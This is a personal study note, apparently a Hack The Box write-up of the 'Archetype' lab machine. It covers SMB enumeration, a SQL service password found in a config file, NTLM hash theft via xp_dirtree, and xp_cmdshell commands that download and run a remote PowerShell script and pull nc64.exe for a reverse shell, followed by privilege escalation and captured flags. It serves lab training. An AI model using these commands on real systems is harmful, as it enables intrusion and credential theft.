2022-07-21 23:37
source: [HTB](obsidian://open?vault=iswearthisismylast&file=Files%2FArchetype.pdf)
tags: #research #htb #tactics #cybersec #SMB #SQL #microsoft #priv_escal 


# Archetype


## Thought Process

#SMB ?? I went for immediate `nmap -sC -Pn` scan.

```
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-07-22T04:37:42
|_Not valid after:  2052-07-22T04:37:42
|_ssl-date: 2022-07-22T04:38:36+00:00; +2s from scanner time.

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 1s
| ms-sql-info: 
|   10.129.2.224:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-21T21:38:21-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-22T04:38:23
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 17.62 seconds
```

smb1 is open with account guest. Also tells me the NetBIOS name

WTF is wrong with [[smbclient]]..
```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\ARCHETYPE\\WORKGROUP -U guest -I 10.129.2.224 -N -L    1 ⨯
session setup failed: NT_STATUS_LOGON_FAILURE
```
```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\ARCHETYPE\\WORKGROUP -U guest -I 10.129.2.224 -L -N    1 ⨯
Enter WORKGROUP\guest's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

```

Well at least it worked. had to use `-I` as netBIOS name was `ARCHETYPE` != `10.129.2.224`

Followed what I did for [[Tactics]],
```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\ARCHETYPE\\backups -U guest -I 10.129.2.224
```

Downloaded `prod.dtsConfig` file,
which gave me 
```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
```
For SQL, ID=ARCHETYPE PASS=M3g4c0rp123

Hello again, [[Impacket]] , this time [[mssqlclient,py]]
Found this neat thing on #HackTricks 
```bash
mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine

#Once logged in you can run queries:
SQL> select @@version;

#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat

#Try to enable code execution
SQL> enable_xp_cmdshell

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```

WHY CAN'T LOGIN WHY'
ok this is fucked up. Don't put password when using mssqlclient.py ...

```
python3 mssqlclient.py  ARCHETYPE/sql_svc@10.129.2.224 -windows-auth
```

and then manual password input.


## Summary
set up xp_cmdshell on victim sql serv
listen on 443, 
set up a http server to serve nc64.exe which is netcat for powershell.
    This is served at home directory. If a server connects to my ip and get requests a file at home directory, they will get it.
```
sudo python3 -m http.server 80                 
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.95.187 - - [23/Jul/2022 22:45:24] code 404, message File not found
10.129.95.187 - - [23/Jul/2022 22:45:24] "GET /nc64.exe HTTP/1.1" 404 -
10.129.95.187 - - [23/Jul/2022 23:24:09] "GET /nc64.exe HTTP/1.1" 200 -

```
From victim sql, use xp_cmdshell to use powershell to connect to http server and download nc64.exe using wget

Then, connect to 443 using nc64.exe (netcat) to open a reverse shell.

We are connected to sql server via user sql_svc
```
C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3 
```

Time to priv escal
same shit. download winPEAS (fucking windows defender not letting download.. thank you but also fuck you)
serve it on my home folder.

winPEAS -> says its vuln for juicy potato.

Not gonna do this for some reason I guess its too hard for very easy box.

check powershell history (ConsoleHost_history.txt kinda like .bash_history)-> find admin login for psexec.py use. -> grab flag from desktop

b91ccec3305e98240082d4474b848528

Not easy. done.